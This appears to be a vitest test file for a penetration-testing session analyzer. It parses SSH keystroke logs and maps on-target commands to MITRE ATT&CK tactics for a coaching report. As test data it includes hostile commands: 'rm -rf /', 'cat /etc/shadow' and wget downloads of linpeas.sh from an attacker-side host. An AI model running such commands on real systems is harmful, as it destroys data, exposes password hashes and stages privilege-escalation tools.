import { describe, it, expect } from "vitest";
import { parseScriptInputLog } from "./parse";
import { sshTargetOf, ingestSshSession, sshSessionsFromDir } from "./ingest";
import { finalizeLiveReport } from "../finalize";
import { classifyCommand, isOnTarget } from "../pipeline/mitre";
import { segmentEpisodes } from "../pipeline/segment";
import { assembleReport } from "../pipeline/ingest";
import type { RawCommand } from "../pipeline/types";
import type { Session, WatcherReport } from "../../types/report";

describe("parseScriptInputLog", () => {
  it("splits on Enter and trims", () => {
    expect(parseScriptInputLog("whoami\rid\r")).toEqual(["whoami", "id"]);
  });

  it("replays backspaces", () => {
    expect(parseScriptInputLog("whoamai\x7f\x7fi\r")).toEqual(["whoami"]);
  });

  it("drops Ctrl-C aborted lines", () => {
    expect(parseScriptInputLog("rm -rf /\x03\rls\r")).toEqual(["ls"]);
  });

  it("strips ANSI/readline escape noise", () => {
    expect(parseScriptInputLog("echo hi\x1b[K\r")).toEqual(["echo hi"]);
  });
});

describe("sshTargetOf", () => {
  it("pulls the host from ssh invocations", () => {
    expect(sshTargetOf("ssh user@10.10.10.5")).toBe("10.10.10.5");
    expect(sshTargetOf("ssh -i key.pem root@box.htb")).toBe("box.htb");
    expect(sshTargetOf("cat user.txt")).toBeNull();
  });
});

describe("ingestSshSession", () => {
  it("tags every command with an ssh:<target> provenance and re-redacts", () => {
    const log = "whoami\rcat root.txt\rping 10.0.0.9\r";
    const cmds = ingestSshSession(log, { target: "10.10.10.5", startedAtMs: 1000, stepMs: 500 });
    expect(cmds).toHaveLength(3);
    expect(cmds.every((c) => c.context_path === "host->ssh:10.10.10.5")).toBe(true);
    // re-redaction: an internal IP typed on the box is masked before it hits the pipeline
    expect(cmds[2].cmd).toBe("ping x.x.x.x");
    // synthetic timestamps advance
    expect(cmds[1].started_at_ms).toBe(1500);
  });
});

describe("context-aware classification (on-target vs local)", () => {
  const ssh = "host->ssh:10.10.10.5";

  it("knows an ssh: context means on-target", () => {
    expect(isOnTarget(ssh)).toBe(true);
    expect(isOnTarget("host")).toBe(false);
    expect(isOnTarget(undefined)).toBe(false);
  });

  it("reclassifies orientation commands as Discovery on the target", () => {
    // locally `whoami` is low-signal privesc-table noise; on the target it's Discovery
    expect(classifyCommand("whoami").tactic).toBe("TA0004");
    expect(classifyCommand("whoami", undefined, ssh)).toMatchObject({ tactic: "TA0007", technique: "T1033" });
    expect(classifyCommand("uname -a", undefined, ssh)).toMatchObject({ tactic: "TA0007", technique: "T1082" });
  });

  it("reads tool pulls as ingress transfer and cred stores as credential access", () => {
    expect(classifyCommand("wget http://x/linpeas.sh", undefined, ssh)).toMatchObject({ tactic: "TA0011", technique: "T1105" });
    expect(classifyCommand("cat /etc/shadow", undefined, ssh)).toMatchObject({ tactic: "TA0006", technique: "T1003" });
  });

  it("reads a nested ssh/scp as lateral movement (pivot)", () => {
    expect(classifyCommand("ssh admin@10.0.0.2", undefined, ssh)).toMatchObject({ tactic: "TA0008", technique: "T1021" });
  });

  it("leaves local classification untouched when there's no target context", () => {
    expect(classifyCommand("wget http://x/tool").tactic).toBe("TA0007"); // external recon locally
  });
});

describe("end-to-end: ssh log → episodes carry post-exploitation tactics", () => {
  it("segments an on-target session into the right phases", () => {
    const log = "whoami\rsudo -l\rwget http://10.10.14.2/linpeas.sh\r";
    const raw = ingestSshSession(log, { target: "10.10.10.5", startedAtMs: 0, stepMs: 1000 });
    const eps = segmentEpisodes(raw);
    const byBinary = Object.fromEntries(eps.filter((e) => e.binary).map((e) => [e.binary, e.tactic]));
    expect(byBinary["whoami"]).toBe("TA0007"); // Discovery, not local noise
    expect(byBinary["sudo"]).toBe("TA0004"); // PrivEsc
    expect(byBinary["wget"]).toBe("TA0011"); // Ingress tool transfer
  });
});

describe("sshSessionsFromDir", () => {
  it("pairs .in transcripts with their .meta sidecars", () => {
    const sessions = sshSessionsFromDir([
      { name: "sess-1.in", content: "id\rwhoami\r" },
      { name: "sess-1.meta", content: JSON.stringify({ target: "10.10.10.5", startedAtMs: 42 }) },
    ]);
    expect(sessions).toHaveLength(1);
    expect(sessions[0]).toMatchObject({ target: "10.10.10.5", startedAtMs: 42, inputLog: "id\rwhoami\r" });
  });

  it("degrades gracefully when the meta sidecar is missing", () => {
    const sessions = sshSessionsFromDir([{ name: "x.in", content: "id\r" }]);
    expect(sessions[0].target).toBe("target"); // fallback label; still on-target via provenance
  });

  it("skips empty transcripts (e.g. one-shot ssh host 'cmd')", () => {
    expect(sshSessionsFromDir([{ name: "x.in", content: "\r\n" }])).toHaveLength(0);
  });
});

describe("finalizeLiveReport folds captured SSH sessions in", () => {
  const base: WatcherReport = {
    schema_version: "1.1",
    session: { uuid: "u", started_at: new Date(0).toISOString(), ended_at: new Date(1000).toISOString(), target_scope: "Box", shell: "bash", source: "local_pty" },
    episodes: [{ seq: 1, cmd: "nmap 10.10.10.5", binary: "nmap", duration_ms: 2000, gap_before_ms: 0, actor: "machine_bound", tactic: "TA0007" }],
    phases: [],
    golden_dag: [],
    metrics: { efficiency_pct: 0, time_waster: { productive_ms: 0, detour_ms: 0, stuck_ms: 0, loop_ms: 0, t_active_ms: 0 }, stealth_score: 100, objective_coverage_pct: 0, technique_breadth: 0 },
    coaching: { skill_radar: { recon: 0, web: 0, exploit: 0, privesc: 0, opsec: 0 }, next_steps: [] },
    redaction_profile: "full",
  };

  it("appends on-target episodes and re-derives phases", () => {
    const out = finalizeLiveReport(base, [{ inputLog: "id\rwget http://x/linpeas.sh\r", target: "10.10.10.5", startedAtMs: 5000 }]);
    const onTarget = out.episodes.filter((e) => e.context_path === "host->ssh:10.10.10.5" && e.binary);
    expect(onTarget.map((e) => e.binary)).toEqual(["id", "wget"]);
    expect(onTarget.find((e) => e.binary === "wget")!.tactic).toBe("TA0011"); // ingress transfer on-target
    // the phase map now includes a post-exploitation phase that wasn't there from local recon alone
    expect(out.phases.some((p) => p.mitre_tactic === "TA0011")).toBe(true);
  });
});

describe("assembleReport folds an SSH session into the report", () => {
  const session: Session = {
    uuid: "11111111-1111-1111-1111-111111111111",
    started_at: new Date(0).toISOString(),
    ended_at: new Date(60000).toISOString(),
    target_scope: "HTB :: Box",
    shell: "bash",
    source: "local_pty",
  };

  it("interleaves on-target commands by time and tags them as post-exploitation", () => {
    // local recon, then an on-target session captured over ssh
    const local: RawCommand[] = [
      { cmd: "nmap -sV 10.10.10.5", started_at_ms: 0, ended_at_ms: 2000, exit_code: 0, output_line_count: 40, context_path: "host" },
    ];
    const report = assembleReport(local, {
      session,
      golden: [],
      ssh: [{ inputLog: "id\rcat /etc/shadow\r", target: "10.10.10.5", startedAtMs: 5000, stepMs: 1000 }],
    });
    const onTarget = report.episodes.filter((e) => e.context_path === "host->ssh:10.10.10.5" && e.binary);
    expect(onTarget.map((e) => e.binary)).toEqual(["id", "cat"]);
    expect(onTarget.find((e) => e.binary === "id")!.tactic).toBe("TA0007"); // Discovery on-target
    expect(onTarget.find((e) => e.binary === "cat")!.tactic).toBe("TA0006"); // /etc/shadow → cred access
    // the local nmap keeps its local classification and comes first in time
    expect(report.episodes.find((e) => e.binary === "nmap")!.tactic).toBe("TA0007");
  });
});
